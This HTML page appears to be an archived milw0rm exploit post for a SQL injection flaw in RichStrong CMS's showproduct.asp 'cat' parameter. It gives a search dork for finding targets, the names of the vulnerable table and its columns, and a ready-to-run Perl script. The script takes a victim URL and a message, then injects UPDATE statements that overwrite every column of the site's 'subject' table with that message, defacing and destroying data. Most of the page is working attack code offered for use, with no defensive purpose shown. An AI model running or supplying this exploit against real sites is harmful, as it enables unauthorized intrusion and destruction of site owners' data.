<html><head><title>RichStrong CMS (showproduct.asp cat) Remote SQL Injection Exploit</title></head><pre>--==+=================== Spanish Hackers Team (www.spanish-hackers.com) =================+==--
--==+         RichStrong CMS  (showproduct.asp?cat=) Remote SQL Injection Exploit        +==--
--==+====================================================================================+==--
                     [+] [JosS] + [Spanish Hackers Team] + [Sys - Project]

[+] Info:

[~] Software: RichStrong CMS
[~] HomePage: http://www.hzrich.cn
[~] Exploit: Remote Sql Injection [High]
[~] Where: showproduct.asp?cat=
[~] Bug Found By: JosS
[~] Contact: sys-project[at]hotmail.com
[~] Web: http://www.spanish-hackers.com
[~] Dork: &quot;Power by:RichStrong CMS&quot;
[~] Dork2: Priv8, xD!

[+] Tables:

[*] Table 1: subject

[+] Columns:

[*] Column 1: id
[*] Column 2: subjectname
[*] Column 3: subjecttype
[*] Column 4: displayorder
[*] Column 5: description
[*] Column 6: layout
[*] Column 7: style
[*] Column 8: category
[*] Column 9: workflowID_R
[*] Column 10: workflowID_S
[*] Column 11: status
[*] Column 12: owner
[*] Column 13: isinherit
[*] Column 14: doclistcount
[*] Column 15: docstyle
[*] Column 16: docsecrettype
[*] Column 17: docpubdays
[*] Column 18: wwwname
[*] Column 19: logo
[*] Column 20: contactus

[+] Exploit:


#!/usr/bin/perl

# RichStrong CMS - Remote SQL Injection Exploit
# Code by JosS
# Contact: sys-project[at]hotmail.com
# Spanish Hackers Team
# www.spanish-hackers.com

use IO::Socket::INET;
use LWP::UserAgent;
use HTTP::Request;
use LWP::Simple;

sub lw
{

my $SO = $^O;
my $linux = &quot;&quot;;
if (index(lc($SO),&quot;win&quot;)!=-1){
		   $linux=&quot;0&quot;;
	    }else{
		    $linux=&quot;1&quot;;
	    }
		if($linux){
system(&quot;clear&quot;);
}
else{
system(&quot;cls&quot;);
system (&quot;title RichStrong CMS - Remote SQL Injection Exploit - By JosS&quot;);
system (&quot;color 02&quot;);
}

}

#*************************** expl ******************************


&amp;lw;

print &quot;\t\t########################################################\n\n&quot;;
print &quot;\t\t#    RichStrong CMS - Remote SQL Injection Exploit     #\n\n&quot;;
print &quot;\t\t#                        by JosS                       #\n\n&quot;;
print &quot;\t\t########################################################\n\n&quot;;

print &quot;Url Victim (Ex: www.localhost/showproduct.asp?cat=):  &quot;;
$host=&lt;STDIN&gt;;
chomp $host;
print &quot;\n&quot;;

  if ( $host   !~   /^http:/ ) {

    # lo a√±adimos
    $host = 'http://' . $host;
}


print &quot;Message: &quot;;
$message=&lt;STDIN&gt;;
chomp $message;
print &quot;\n&quot;;

@columnas=(&quot;id&quot;,&quot;subjectname&quot;,&quot;subjecttype&quot;,&quot;displayorder&quot;,&quot;description&quot;,&quot;layout&quot;,&quot;style&quot;,&quot;category&quot;,&quot;workflowID_R&quot;,&quot;workflowID_S&quot;,&quot;status&quot;,&quot;owner&quot;,
&quot;isinherit&quot;,&quot;doclistcount&quot;,&quot;docstyle&quot;,&quot;docsecrettype&quot;,&quot;docpubdays&quot;,&quot;wwwname&quot;,&quot;logo&quot;,&quot;contactus&quot;);


for ($i=0;$i&lt;=21;$i++)

{

$comando=&quot;'%20update%20subject%20set%20$columnas[$i]='&lt;h1&gt;$message'--&quot;;
$comando =~ s/ /+/g;

my $final = $host.$comando;
my $ua = LWP::UserAgent-&gt;new;
my $req = HTTP::Request-&gt;new(GET =&gt; $final);
$doc = $ua-&gt;request($req)-&gt;as_string;

print &quot;update: $columnas[$i]\n&quot;;

}



--==+=================== Spanish Hackers Team (www.spanish-hackers.com) =================+==--
--==+                                       JosS                                         +==--
--==+====================================================================================+==--
                                       [+] [The End]

# milw0rm.com [2008-01-14]</pre></html>